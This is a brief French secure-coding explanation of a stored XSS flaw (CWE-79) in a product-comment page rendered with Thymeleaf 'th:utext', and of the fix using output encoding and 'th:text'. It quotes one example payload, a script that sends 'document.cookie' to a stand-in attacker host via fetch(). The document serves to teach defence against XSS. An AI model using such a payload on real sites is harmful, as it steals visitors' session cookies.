# Stored XSS — CWE-79

La version vulnérable enregistre le texte d'un commentaire produit tel quel puis le restitue via `th:utext` à tous les visiteurs de la page produit. Une charge utile déposée une seule fois (`<script>fetch('https://attaquant.example/steal?c='+document.cookie)</script>`) s'exécute ensuite dans le navigateur de chaque visiteur, sans lien piégé ni interaction supplémentaire — c'est ce qui rend le stored XSS particulièrement dangereux par rapport au reflected XSS.

La version corrigée conserve la donnée brute en base mais encode systématiquement chaque commentaire pour le contexte HTML (`Encode.forHtml()`) juste avant l'affichage, et le template utilise `th:text` (échappement automatique) au lieu de `th:utext`. Une limite de longueur est également ajoutée en entrée. L'échappement est appliqué à la lecture, garantissant la protection quel que soit le canal qui a permis l'insertion initiale.

**Référence** : CWE-79 (Improper Neutralization of Input During Web Page Generation).
